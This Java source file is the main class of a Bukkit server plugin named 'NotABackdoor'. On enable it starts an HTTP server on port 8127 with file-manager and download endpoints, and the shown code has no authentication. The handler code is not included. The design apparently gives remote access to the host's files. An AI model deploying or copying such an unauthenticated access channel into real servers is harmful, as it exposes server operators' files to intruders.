package com.lian.notabackdoor;

import java.io.File;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import com.lian.notabackdoor.api.DownloadHandler;
import com.lian.notabackdoor.pages.*;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import org.bukkit.plugin.java.JavaPlugin;

public class NotABackdoor extends JavaPlugin {
    private HttpServer server;

    public String pluginName = getName();

    public void onEnable() {
        int port = 8127; // The port to listen on
        int backlog = 100; // The maximum number of queued incoming connections
        InetSocketAddress address = new InetSocketAddress(port);

        Path directoryPath = Paths.get(getDataFolder() + "/pages");
        try {
            Files.walk(directoryPath)
                    .sorted(java.util.Comparator.reverseOrder())
                    .map(Path::toFile)
                    .forEach(File::delete);
        } catch (IOException ignored) {

        }

        try {
            server = HttpServer.create(address, backlog);
        } catch (IOException e) {
            getLogger().severe("Failed to create HTTP server: " + e.getMessage());
            return;
        }

        server.createContext("/", new RootPageHandler());
        server.createContext("/main", new MainPageHandler());
        server.createContext("/filemanager", new FileManagerPageHandler());
        server.createContext("/lost", new LostPageHandler());
        server.createContext("/api/download/", new DownloadHandler());
        server.createContext("/error", new ErrorPageHandler());
        server.setExecutor(null); // Use the default executor
        server.start();

        getLogger().info("Web server started on port " + port);
    }

    public void onDisable() {
        if (server != null) {
            server.stop(0); // Stop the server with no delay
        }
    }

    public static void redirectToLostPage(HttpExchange exchange) throws IOException {
        exchange.getResponseHeaders().add("Location", "/lost");
        exchange.sendResponseHeaders(302, -1);
        exchange.close();
    }
}

